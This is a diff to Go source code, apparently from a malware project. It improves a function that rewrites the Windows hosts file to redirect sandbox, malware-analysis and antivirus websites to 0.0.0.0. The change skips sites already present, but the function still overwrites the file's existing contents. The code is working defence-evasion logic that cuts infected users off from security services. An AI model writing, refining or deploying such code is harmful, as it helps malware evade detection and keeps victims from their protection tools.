@@ -1,6 +1,9 @@
 package main
 
-import "os"
+import (
+	"os"
+	"strings"
+)
 
 // List of sandbox, analysis, and antivirus websites to block
 var blockedSites = []string{
@@ -34,14 +37,21 @@ var blockedSites = []string{
 const hostsFilePath = `C:\Windows\System32\drivers\etc\hosts`
 
 func blockSites() {
+	f, err := os.ReadFile(hostsFilePath)
+	if err != nil {
+		return
+	}
+
 	var b []byte
 	for _, site := range blockedSites {
+		if strings.Contains(string(f), site) {
+			continue
+		}
 		// Append entries to block the site by redirecting to loopback address
 		b = append(b, []byte("0.0.0.0 "+site+"\n")...)
 		b = append(b, []byte("0.0.0.0 www."+site+"\n")...)
 	}
-	f := os.WriteFile(hostsFilePath, b, 0644)
-	if f != nil {
+	if err := os.WriteFile(hostsFilePath, b, 0644); err != nil {
 		return
 	}
 }
